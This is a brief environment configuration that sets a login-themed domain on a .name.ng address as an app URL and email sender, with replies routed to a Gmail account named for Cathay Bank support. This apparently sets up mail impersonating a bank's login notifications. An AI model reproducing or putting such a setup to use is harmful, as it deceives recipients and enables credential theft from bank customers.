# Production Domain Configuration
CUSTOM_DOMAIN=notificationslogin.name.ng
APP_URL=https://notificationslogin.name.ng

# Institutional Email Configuration (notificationslogin.name.ng)
EMAIL_FROM=notifications@notificationslogin.name.ng
EMAIL_REPLY_TO=supportcathaybank@gmail.com
